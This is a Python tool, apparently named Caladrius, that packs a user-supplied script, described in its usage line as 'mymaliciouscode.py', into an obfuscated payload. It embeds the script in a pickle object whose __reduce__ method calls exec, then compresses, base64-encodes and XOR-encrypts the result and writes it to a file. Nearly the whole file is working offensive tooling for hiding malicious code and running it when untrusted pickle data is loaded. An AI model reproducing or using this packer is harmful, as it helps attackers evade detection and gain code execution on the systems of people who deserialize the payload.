import zlib, pickle, os, sys, traceback

from base64 import b64encode
from os.path import exists

def xor(
    plain: str, 
    key: bytes
    ) -> str:
    """
    XOR's @plain using @key as key

    Args:
        plain str: Data to encrypt
        key bytes: Key to use for encryption, must be equal or bigger than @plain
    
    Returns:
        str: The ciphertext
    """

    if len(key) < len(plain):
        raise SystemExit(f"Error: Key size should be equal or bigger than {len(plain)}")

    output = ""
    for a, b in zip(plain, key):
        try:
            output += chr(ord(a) ^ b)
        except Exception as exc:
            print(f"Failed to encrypt '{a}': {exc}")
    
    return output

def compress_then_b64(
    raw: bytes
    ) -> str:
    """
    Compresses @raw using Zlib, then converts that data into Base64

    Args:
        raw bytes: Data to convert
    
    Returns:
        str: Base64 encoded, Zlib compressed data
    """

    compressed = zlib.compress(raw)
    return b64encode(
        compressed
    ).decode()

# https://davidhamann.de/2020/04/05/exploiting-python-pickle/
class PickleExecutor:
    __contents__ = ""

    def __reduce__(self):
        return exec, (self.__contents__,)

if __name__ == "__main__":

    if len(sys.argv) != 2:
        sys.exit(f"[!] Usage: python3 {sys.argv[0]} [scriptname]\nExample: python3 {sys.argv[0]} mymaliciouscode.py")

    try:
        plain = sys.argv[1]
        if not exists(plain):
            sys.exit(f"[!] '{plain}' does not exist!")
        
        with open(plain) as fd:
            plain = fd.read()

        print("\n[*] Pickling...")
        pickle_executor = PickleExecutor()
        pickle_executor.__contents__ = plain
        pickled = pickle.dumps(pickle_executor)

        print("\n[*] Pickled payload:")
        print(repr(pickled))

        payload = compress_then_b64(pickled)

        key = os.urandom(len(payload))

        print("\n[*] Finished compressing and encoding, results:")
        print(f"  - Original size: {len(plain)}")
        print(f"  - Compressed & encoded: {len(payload)}")

        print(f"\n[*] XOR'ing payload with key {repr(key)}")
        encrypted = xor(payload, key)

        final = b64encode(encrypted.encode())
        print("\n[*] Final payload, payload:")
        print(repr(final))

        print("\n[*] Saving to 'out.caladrius.py'")
        with open("out.caladrius.py", "wb+") as fd:
            fd.write(final)
    
    except KeyboardInterrupt:
        sys.exit("\n")
    
    except Exception:
        print("[!] Exception occurred:")
        traceback.print_exc()